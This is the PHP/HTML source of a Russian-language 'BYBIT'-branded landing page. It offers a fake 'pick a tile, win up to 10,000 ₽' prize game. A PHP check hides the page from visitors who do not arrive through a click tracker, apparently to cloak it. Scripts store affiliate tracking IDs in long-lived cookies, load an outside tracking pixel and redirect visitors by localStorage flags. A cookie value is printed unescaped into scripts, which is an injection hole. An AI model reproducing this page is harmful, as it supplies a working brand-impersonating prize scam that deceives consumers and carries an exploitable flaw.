<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BYBIT</title>
    <link rel="icon" href="./img/icons/logo.svg" type="image/x-icon" />
    <link rel="stylesheet" href="styles.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100..700;1,100..700&display=swap"
      rel="stylesheet"
    />

    <script>
      // Функция для получения значения параметра из URL
      function getURLParameter(name) {
        name = name.replace(/[\[\]]/g, "\\$&");
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
      }

      // Получаем значение параметра bge
      const bgeValue = getURLParameter("bge");
      const buyerValue = getURLParameter("buy_id") ?? "002";

      // Если bge найден, записываем его в куки
      if (bgeValue) {
        document.cookie = `bge=${bgeValue}; path=/; max-age=31536000`; // Куки на 1 год
        document.cookie = `buyerValue=${buyerValue}; path=/; max-age=31536000`; // Куки на 1 год
      }
    </script>

    <script>
      window.bgdataLayer = window.bgdataLayer || [];

      function bge() {
          bgdataLayer.push(arguments);
      }
      bge('init', '<?= $_COOKIE['bge'] ?>');
    </script>
    <script
      async
      src="https://api.imotech.video/ad/events.js?pixel_id=<?= $_COOKIE['bge'] ?>"
    ></script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <header class="header">
      <div class="header__logo">
        <img src="./img/icons/logo.png" alt="Logo" class="header__logo-img" />
      </div>
    </header>
    <main class="main">
      <section class="main__section primary">
        <div class="main__section-primary__container">
          <span class="main__section-primary__container-item top"
            >Выиграй свой приз</span
          >
          <span class="primary__text hidden">Вы выиграли</span>
          <p class="main__section-primary__container-item" id="sum-start-text">
            до <span class="secondary" id="sum-text">10 000 ₽</span>
          </p>
          <span class="primary__subheading hidden">Пройдите быстрый опрос</span>
        </div>
      </section>
      <section class="main__section third">
        <span class="third__subheading">Выберите 1 плитку</span>
        <div class="third__plates">
          <div class="plates__item">
            <div class="plates__inner">
              <div class="plates__front"></div>
              <div class="plates__back"></div>
            </div>
          </div>
          <div class="plates__item">
            <div class="plates__inner">
              <div class="plates__front"></div>
              <div class="plates__back"></div>
            </div>
          </div>
          <div class="plates__item">
            <div class="plates__inner">
              <div class="plates__front"></div>
              <div class="plates__back"></div>
            </div>
          </div>
          <div class="backdrop-layer"></div>
        </div>
        <div class="main__section-secondary__container-confetti">
          <img
            src="./img/confettiL.png"
            alt="Confetti Left"
            class="confetti confetti--left"
          />
          <img
            src="./img/confettiR.png"
            alt="Confetti Right"
            class="confetti confetti--right"
          />
        </div>
        <button class="main__section-third__container-button hidden">
          Забрать выигрыш
        </button>
        <p class="main__section-third__container-text" id="footer-text">
          ДЛЯ УЧАСТИЯ В АКЦИИ ВЫ ДОЛЖНЫ БЫТЬ СОВЕРШЕННОЛЕТНИМ ГРАЖДАНИНОМ ИЛИ
          РЕЗИДЕНТОМ РФ
        </p>
      </section>
    </main>
    <script src="main.js?v=45"></script>
    <!--<script src="loadAssets.js?v=321"></script>-->

    <script>
      window.onload = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
